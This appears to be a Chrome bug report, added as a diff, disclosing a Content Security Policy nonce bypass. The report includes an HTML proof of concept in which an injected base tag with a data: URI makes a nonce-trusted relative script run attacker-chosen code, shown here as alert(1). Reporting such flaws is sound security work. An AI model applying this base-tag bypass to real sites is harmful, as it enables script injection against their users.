@@ -1,0 +1,28 @@
+UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36
+
+Steps to reproduce the problem:
+PoC:
+
+<html>
+<head>
+<meta http-equiv=content-security-policy content="object-src 'none';script-src 'nonce-random-secret'">
+<title> Fake XSS </title> </head>
+<body>
+<base href=data:/,-alert(1)/>
+<script src="./lib/jquery.js" nonce=random-secret></script>
+</body>
+</html>
+
+Online PoC: https://jsbin.com/vigodiqifo/1/edit?html,output
+
+What is the expected behavior?
+Will see alert box.
+
+What went wrong?
+Base uri changed script uri bypassed nonce prevent.
+
+Did this work before? N/A
+
+Chrome version: 55.0.2883.95  Channel: n/a
+OS Version: OS X 10.12.0
+Flash Version: Shockwave Flash 24.0 r0
